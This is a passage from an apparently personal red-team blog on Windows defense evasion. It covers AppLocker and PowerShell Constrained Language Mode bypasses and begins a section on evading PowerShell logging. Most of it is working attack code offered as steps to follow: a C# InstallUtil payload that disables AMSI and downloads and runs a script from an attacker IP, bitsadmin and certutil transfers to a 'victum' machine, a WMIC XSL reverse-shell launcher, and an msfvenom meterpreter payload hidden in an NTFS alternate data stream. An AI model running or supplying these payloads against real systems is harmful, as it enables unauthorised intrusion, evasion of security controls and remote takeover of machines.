.\Downloads\nc64.exe C:\Windows\System32\spool\drivers\color\nc64.exe</span><br><span class="line"><span class="built_in">PS</span> C:\Users\matio&gt; &amp; C:\Windows\System32\spool\drivers\color\nc64.exe</span><br><span class="line">Program <span class="string">&#x27;nc64.exe&#x27;</span> failed to run: This program is blocked by <span class="built_in">group</span> policy. <span class="keyword">For</span> more information, contact your system</span><br><span class="line">administratorAt line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ &amp; C:\Windows\System32\spool\drivers\color\nc64.exe</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.</span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ &amp; C:\Windows\System32\spool\drivers\color\nc64.exe</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandFailed</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\matio&gt; <span class="built_in">echo</span> <span class="string">&quot;N1NJ10&quot;</span> &gt;&gt; C:\Windows\System32\spool\drivers\color\nc64.exe</span><br><span class="line"><span class="built_in">PS</span> C:\Users\matio&gt; &amp; C:\Windows\System32\spool\drivers\color\nc64.exe <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">7777</span></span><br></pre></td></tr></table></figure></figure>

<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def20.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>


<h3 id="InstallUtil-Shell-Updated-Part"><a href="#InstallUtil-Shell-Updated-Part" class="headerlink" title="InstallUtil - Shell ( Updated Part )"></a>InstallUtil - Shell ( Updated Part )</h3><p>There is a bypass technique that usess the <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool">Installutil</a> , My first time to see it from <a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/">pentestlab</a> i reccomed u to read this before contiue</p>
<p>As we know now , when can use installutil to run an exe files inside them to bypass the applocker rules ( Since this utility is a <span style="color:yellow">Microsoft signed binary</span> then it could be used to run any .NET executables bypassing in that way AppLocker restrictions. Also this utility is <span style="color:yellow">located inside the Windows directory</span> which AppLocker policies are not going to be applied as the contents of the Windows folder are needed to be executed in order for the system to run normally ) and bypass the CLM lang ( InstallUtil <span style="color:yellow">executes the code in a .NET context, not PowerShell, avoiding CLM restrictions</span>. ) , okey let’s see how we can exploit this using this code</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation.Runspaces;</span><br><span class="line"><span class="keyword">using</span> System.Configuration.Install;</span><br><span class="line"></span><br><span class="line">namespace BypassCLM</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Program</span></span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">static</span> void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;This is vairous , ru kidding !!!! &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="type">System.ComponentModel.RunInstaller</span>(<span class="type">true</span>)]</span><br><span class="line">    public <span class="class"><span class="keyword">class</span> <span class="title">Sample</span> : <span class="title">System</span>.<span class="title">Configuration</span>.<span class="title">Install</span>.<span class="title">Installer</span></span></span><br><span class="line">    &#123;</span><br><span class="line">        public override void Uninstall(System.Collections.IDictionary savedState)</span><br><span class="line">        &#123;</span><br><span class="line">           string amsiBypass = <span class="string">@&quot;[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;).GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)&quot;;</span></span><br><span class="line"><span class="string">           string cmd = &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.99.21:8080/a9kMET&#x27;)&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">           Runspace rs = RunspaceFactory.CreateRunspace();</span></span><br><span class="line"><span class="string">           rs.Open();</span></span><br><span class="line"><span class="string">           PowerShell ps = PowerShell.Create();</span></span><br><span class="line"><span class="string">           ps.Runspace = rs;</span></span><br><span class="line"><span class="string">           ps.AddScript(amsiBypass); // First, bypass AMSI</span></span><br><span class="line"><span class="string">           ps.Invoke();</span></span><br><span class="line"><span class="string">           ps.AddScript(cmd); // Then, execute the downloaded script</span></span><br><span class="line"><span class="string">           ps.Invoke();</span></span><br><span class="line"><span class="string">           rs.Close();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></figure>

<p>Create ur reverse shell and change the cmd variable ( u can do it with metasploit or any other c2 ) and the amsiBypass also , Then compile it with the .Net <a target="_blank" rel="noopener" href="https://dotnet.microsoft.com/en-us/download/dotnet-framework">csc.exe</a> binary</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">&amp; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\csc.exe /reference:<span class="string">&quot;C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll&quot;</span> /out:Bypass.exe BypassCLM.cs</span><br><span class="line">certutil <span class="literal">-encode</span> Bypass.exe bypass.txt</span><br></pre></td></tr></table></figure></figure>

<p>Then run your <a target="_blank" rel="noopener" href="https://github.com/danvk/RangeHTTPServer">RangeHTTPServer</a> ( <strong>Not http</strong> )</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">python3 -m RangeHTTPServer 1234</span><br></pre></td></tr></table></figure></figure>

<p>Then go to your victum and excute those commands</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer Bad_Work http://<span class="number">192.168</span>.<span class="number">99.21</span>/bypass.txt C:\Windows\System32\spool\drivers\color\bypass.txt</span><br><span class="line">certutil <span class="literal">-decode</span> C:\Windows\System32\spool\drivers\color\bypass.txt C:\Windows\System32\spool\drivers\color\bypass.exe</span><br><span class="line">&amp; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\System32\spool\drivers\color\bypass.exe</span><br></pre></td></tr></table></figure></figure>

<p>If you follow those steps you should get the shell</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def21.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>


<h3 id="WMIC-Updated-Part"><a href="#WMIC-Updated-Part" class="headerlink" title="WMIC ( Updated Part )"></a>WMIC ( Updated Part )</h3><p>There is a small trick when u can use a wmic to bypass this restrictions , I try this one on a ctf on hackthebox you can use this xsl file ( Change the reverse shell ) :</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&#x27;1.0&#x27;</span>?&gt;</span><br><span class="line">&lt;stylesheet version=<span class="string">&quot;1.0&quot;</span></span><br><span class="line">xmlns=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="line">xmlns:ms=<span class="string">&quot;urn:schemas-microsoft-com:xslt&quot;</span></span><br><span class="line">xmlns:user=<span class="string">&quot;http://mycompany.com/mynamespace&quot;</span>&gt;</span><br><span class="line">&lt;output method=<span class="string">&quot;text&quot;</span>/&gt;</span><br><span class="line">        &lt;ms:script implements<span class="literal">-prefix</span>=<span class="string">&quot;user&quot;</span> language=<span class="string">&quot;JScript&quot;</span>&gt;</span><br><span class="line">                &lt;![<span class="type">CDATA</span>[</span><br><span class="line">                        <span class="type">var</span> <span class="type">r</span> = <span class="type">new</span> <span class="type">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);</span><br><span class="line">                        <span class="type">r.Run</span>(<span class="string">&quot;powershell.exe -nop -w hidden -e xxxxxxxxxxxxxxxxxx=&quot;</span>);</span><br><span class="line">                ]]&gt;</span><br><span class="line">        &lt;/ms:script&gt;</span><br><span class="line">&lt;/stylesheet&gt;</span><br></pre></td></tr></table></figure></figure>

<p>Then you can get the file from the server or download and excute it</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">wmic <span class="keyword">process</span> get brief /format:<span class="string">&quot;rev.xsl&quot;</span></span><br><span class="line">wmic <span class="keyword">process</span> get brief /format:<span class="string">&quot;http://192.168.99.21:1234/rev.xsl&quot;</span></span><br></pre></td></tr></table></figure></figure>

<blockquote>
<p>There is more ways you can test from here :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://ppn.snovvcra.sh/pentest/infrastructure/ad/av-edr-evasion/applocker-bypass">snovvcra.sh</a></li>
<li><a target="_blank" rel="noopener" href="https://itm4n.github.io/reinventing-powershell/#constrained-language-mode-clm">itm4n</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/api0cradle/UltimateAppLockerByPassList">UltimateAppLockerByPassList</a><br>{: .prompt-tip }</li>
</ul>
</blockquote>
<h3 id="Alternate-Data-Stream"><a href="#Alternate-Data-Stream" class="headerlink" title="Alternate Data Stream"></a>Alternate Data Stream</h3><p><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Windows_alternate_data_stream">OWASP</a> said The NTFS file system includes support for alternate data streams. This is not a well known feature and was included, primarily, to provide compatibility with files in the Macintosh file system. Alternate data streams allow files to contain more than one stream of data. Every file has at least one data stream. In Windows, this default data stream is called <code>:$DATA</code></p>
<p>So we can hide a data stream in any file without the user even konw !!</p>
<p>So let’s first create our reverse shell</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.99.21 LPORT=7771 -a x64 --platform Windows -f exe -o rev_shell.exe</span><br></pre></td></tr></table></figure></figure>

<p>Then transfer the file to the victum machine and embaded it into another file ( <strong>Run this from the cmd</strong> )</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\matio\Desktop\rev_shell.exe &gt; <span class="string">&quot;C:\Users\matio\Desktop\test.txt -Stream rev_shell.exe&quot;</span></span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> call create <span class="string">&#x27;&quot;test.txt:rev_shell.exe&quot;&#x27;</span></span><br></pre></td></tr></table></figure></figure>

<p>Then it should be worked.</p>
<h2 id="Powershell-CLM-Bypass"><a href="#Powershell-CLM-Bypass" class="headerlink" title="Powershell CLM Bypass"></a>Powershell CLM Bypass</h2><p>Let’s see if we can bypass the CLM , First let’s see the LanguageMode we are using</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ExecutionContext</span>.SessionState.LanguageMode</span><br></pre></td></tr></table></figure></figure>

<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def22.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>There is more than a way to Bypass the CLM</p>
<h3 id="PowerShdll"><a href="#PowerShdll" class="headerlink" title="PowerShdll"></a>PowerShdll</h3><p>we can Run PowerShell with rundll32. Bypass software restrictions using <a target="_blank" rel="noopener" href="https://github.com/p3nt4/PowerShdll">PowerShdll</a>, so Let’s see</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer Bad_Work http://<span class="number">192.168</span>.<span class="number">99.21</span>:<span class="number">1234</span>/PowerShdll_x64.dll C:\Windows\System32\spool\drivers\color\PowerShdll_x64.dl</span><br><span class="line">rundll32.exe PowerShdll_x64.dll,main <span class="literal">-w</span></span><br></pre></td></tr></table></figure></figure>

<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def23.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<blockquote>
<p>You can try some other tools like <a target="_blank" rel="noopener" href="https://github.com/padovah4ck/PSByPassCLM">PSByPassCLM</a> or <a target="_blank" rel="noopener" href="https://github.com/calebstewart/bypass-clm">bypass-clm</a><br>{: .prompt-tip }</p>
</blockquote>
<h3 id="TEMP-ORARY-Updated-Part"><a href="#TEMP-ORARY-Updated-Part" class="headerlink" title="%TEMP%ORARY ( Updated Part )"></a>%TEMP%ORARY ( Updated Part )</h3><p>One of the catchy methods to bypass the CLM language in powershell is this method</p>
<p>Remmeber in the beggening of talking about the CLM i leave you with an important note by Rudy Ooms [ When PowerShell starts, it checks whether <a target="_blank" rel="noopener" href="https://call4cloud.nl/deploying-applocker-intune-powershell/"><strong>AppLocker Script Enforcement</strong></a> Rules are present. It does this by simulating the execution of a test <strong>PowerShell script placed in the user’s temporary</strong> folder and evaluating it against the system’s policies. ] so why this important ?</p>
<p>By focus on this statment we should understand that , when a user open the powershell for the first time the system made a random powershell script in his temp dir ( Which are not in the dirs that can execute any binaries or powershell scripts ) and see if this user can execute this script or not</p>
<p>If yes okey make him in the FullLanguage mode if not change the language mode to ConstrainedLanguage , Okey what if we change the user temp dir in the enviroment to path that we have access and this path in the dirs that applocker permit them to run the executables and scripts from ( Like we do in the applocker bypass ) and start a new powershell session with those new env variables ?</p>
<p>This was <a target="_blank" rel="noopener" href="http://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/">Oddvar</a> idea so he make this script , let’s test it and see if this sucess or not</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$CurrTemp</span> = <span class="variable">$env:temp</span></span><br><span class="line"><span class="variable">$CurrTmp</span> = <span class="variable">$env:tmp</span></span><br><span class="line"><span class="variable">$TEMPBypassPath</span> = <span class="string">&quot;C:\windows\temp&quot;</span></span><br><span class="line"><span class="variable">$TMPBypassPath</span> = <span class="string">&quot;C:\windows\temp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Tmp <span class="literal">-Value</span> <span class="string">&quot;<span class="variable">$TEMPBypassPath</span>&quot;</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Temp <span class="literal">-Value</span> <span class="string">&quot;<span class="variable">$TMPBypassPath</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Class</span> win32_process <span class="literal">-Name</span> create <span class="literal">-ArgumentList</span> <span class="string">&quot;powershell&quot;</span></span><br><span class="line"><span class="built_in">sleep</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Set it back</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Tmp <span class="literal">-Value</span> <span class="variable">$CurrTmp</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Temp <span class="literal">-Value</span> <span class="variable">$CurrTemp</span></span><br><span class="line"></span><br><span class="line">OR the Cool one by Matt Graeber Note -&gt; https://posts.specterops.io/bypassing<span class="literal">-application-whitelisting-with-runscripthelper-exe-1906923658fc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Path to Powershell</span></span><br><span class="line"><span class="variable">$CMDLine</span> = <span class="string">&quot;<span class="variable">$PSHOME</span>\powershell.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Getting existing env vars</span></span><br><span class="line">[<span class="built_in">String</span>[]] <span class="variable">$EnvVarsExceptTemp</span> = <span class="built_in">Get-ChildItem</span> Env:\* <span class="literal">-Exclude</span> <span class="string">&quot;TEMP&quot;</span>,<span class="string">&quot;TMP&quot;</span>| % &#123; <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$_</span>.Name)=<span class="variable">$</span>(<span class="variable">$_</span>.Value)&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#Custom TEMP and TMP</span></span><br><span class="line"><span class="variable">$TEMPBypassPath</span> = <span class="string">&quot;Temp=C:\windows\temp&quot;</span></span><br><span class="line"><span class="variable">$TMPBypassPath</span> = <span class="string">&quot;TMP=C:\windows\temp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Add the to the list of vars</span></span><br><span class="line"><span class="variable">$EnvVarsExceptTemp</span> += <span class="variable">$TEMPBypassPath</span></span><br><span class="line"><span class="variable">$EnvVarsExceptTemp</span> += <span class="variable">$TMPBypassPath</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Define the start params</span></span><br><span class="line"><span class="variable">$StartParamProperties</span> = <span class="selector-tag">@</span>&#123; EnvironmentVariables = <span class="variable">$EnvVarsExceptTemp</span> &#125;</span><br><span class="line"><span class="variable">$StartParams</span> = <span class="built_in">New-CimInstance</span> <span class="literal">-ClassName</span> Win32_ProcessStartup <span class="literal">-ClientOnly</span> <span class="literal">-Property</span> <span class="variable">$StartParamProperties</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Start a new powershell using the new params</span></span><br><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-ClassName</span> Win32_Process <span class="literal">-MethodName</span> Create <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">CommandLine = <span class="variable">$CMDLine</span></span><br><span class="line">ProcessStartupInformation = <span class="variable">$StartParams</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></figure>

<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def24.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<h2 id="PowerShell-Logging"><a href="#PowerShell-Logging" class="headerlink" title="PowerShell Logging"></a>PowerShell Logging</h2><p>PowerShell logging is the process of recording activities within PowerShell sessions, such as commands executed, scripts run, and their outputs or execution details. It is designed to support auditing, debugging, and security monitoring in Windows environments. The three primary logging types : </p>
<ul>
<li>Transcription</li>
<li>Script Block Logging</li>
<li>Module Logging</li>
</ul>
<p>Each serves distinct purposes, capturing different levels of detail about PowerShell activities, so let us talk about them and their bypasses and how to configure them.</p>
<h3 id="PowerShell-Transcription"><a href="#PowerShell-Transcription" class="headerlink" title="PowerShell Transcription"></a>PowerShell Transcription</h3><p>The Transcription loging records both input (commands typed) and output (responses shown) of PowerShell sessions, like a session transcript.</p>
<p>Let’s configure it from Local Group Policy -&gt; Administrative Templates -&gt; Windows Components -&gt; Windows PowerShell Then navigate to PowerShell Transcription</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def25.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>Let’s see how this work , you can run this script to know the Transcription are on or not</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$transcriptionSettings</span> = <span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription&quot;</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$transcriptionSettings</span> <span class="operator">-and</span> <span class="variable">$transcriptionSettings</span>.EnableTranscripting <span class="operator">-eq</span> <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;Transcription logging is enabled.&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$transcriptionSettings</span>.OutputDirectory) &#123;</span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;Log directory: <span class="variable">$</span>(<span class="variable">$transcriptionSettings</span>.OutputDirectory)&quot;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;Log directory: Default (User&#x27;s Documents folder, typically <span class="variable">$HOME</span>\Documents)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$transcriptionSettings</span>.EnableInvocationHeader <span class="operator">-eq</span> <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;Invocation headers are included in logs.&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;Transcription logging is not enabled via Group Policy.&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></figure>

<p>Let’s see what this will do</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def26.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>


<p>you can’t get the script content here you just get the command and the ouput like a session</p>
<blockquote>
<p>what is the invokation headers , <a target="_blank" rel="noopener" href="https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/">Patrick</a> explain them here with those screenshots :</p>
<p>Transcription Logging without invokation headers activated:</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def27.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>
The second one shows logging with invokation headers activated:
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def28.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure><p>{: .prompt-info }</p>
</blockquote>
<h4 id="PowerShell-Transcription-Bypass"><a href="#PowerShell-Transcription-Bypass" class="headerlink" title="PowerShell Transcription Bypass"></a>PowerShell Transcription Bypass</h4><p>This one Doesn’t have many resources but there is a one <a target="_blank" rel="noopener" href="https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass">here</a> by <a target="_blank" rel="noopener" href="https://avantguard.io/en/blog/author/jann-lemm">jann lemm</a> , The idea behinde this bypass is the Transcription only check one thing to determine if it’s enabled and it’s the PowerShell registry (<strong>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription)</strong> or Group Policy to check if <strong>EnableTranscripting is 1</strong></p>
<p>To change the key we need an administrative privileges so what should we do ?</p>
<p>jann lemm said , If the registry key EnableTranscripting is set to 0 while in an active PowerShell session, the transcript is continued and no bypass is possible, even though the cached value is set to 0. But if these changes to the field are made before a custom PowerShell runspace is opened, the runspace will use the cached (and modified) values, effectively allowing a bypass of the three logging mechanisms by an unprivileged user.</p>
<p>For the first time i don’t understand it , So i will try to explain this more for you in Practical way like the above</p>
<p>So Let’s see how the jann lemm bypass work and how the regular exe work to work Hello World</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Hello_World.cs </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation.Runspaces;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] <span class="keyword">args</span></span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Create a default runspace</span></span><br><span class="line">        <span class="keyword">using</span> (Runspace runspace = RunspaceFactory.CreateRunspace())</span><br><span class="line">        &#123;</span><br><span class="line">            runspace.Open();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Create a pipeline</span></span><br><span class="line">            <span class="keyword">using</span> (Pipeline pipeline = runspace.CreatePipeline())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Add the command to print &quot;Hello World&quot;</span></span><br><span class="line">                pipeline.Commands.AddScript(<span class="string">&quot;Write-Output &#x27;Hello World&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Execute the pipeline and get results</span></span><br><span class="line">                <span class="keyword">var</span> results = pipeline.Invoke();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Display results</span></span><br><span class="line">                <span class="keyword">foreach</span> (PSObject result <span class="keyword">in</span> results)</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(result.ToString());</span><br><span class="line">                